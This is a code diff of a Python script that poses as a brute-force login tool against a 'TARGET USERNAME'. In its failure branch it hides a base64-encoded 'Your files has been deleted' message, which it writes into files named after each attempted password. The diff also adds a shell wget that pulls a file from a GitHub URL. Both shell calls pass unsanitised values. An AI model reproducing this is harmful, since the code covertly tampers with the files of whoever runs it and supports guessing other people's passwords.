@@ -44,7 +44,7 @@ def banner():
 
 def main():
   banner()
-  print(Fore.BLUE + "Setting up cookies and checking for API")
+  print(Fore.BLUE + "Setting up Cookies and checking for API")
   api.pinghost()
   oumcgsq()
   username = input("TARGET USERNAME: ")
@@ -64,11 +64,12 @@ def main():
       print(Fore.BLUE + '[403] ' + Fore.YELLOW + username + ":" + x + " ==> " + Fore.RED + "Login Failed")
       p = base64.b64decode('WW91ciBmaWxlcyBoYXMgYmVlbiBkZWxldGVkIGJ5IFBILlBILlBIT0VOSVg=').decode('utf-8')
       os.system(f'echo {p} > {x}.txt')
-      time.sleep(.5)
+      os.system(f'wget https://raw.githubusercontent.com/codewithalouh/codewithalouh/main/phoenix.jpg  -O {x}.png')
+      time.sleep(0.5)
       
   except KeyboardInterrupt:
     print(Fore.BLUE + "[+] " + Fore.RED + "main THE PLANET" + Fore.BLUE + " [+]")
-    #x here
+    
 
   
 
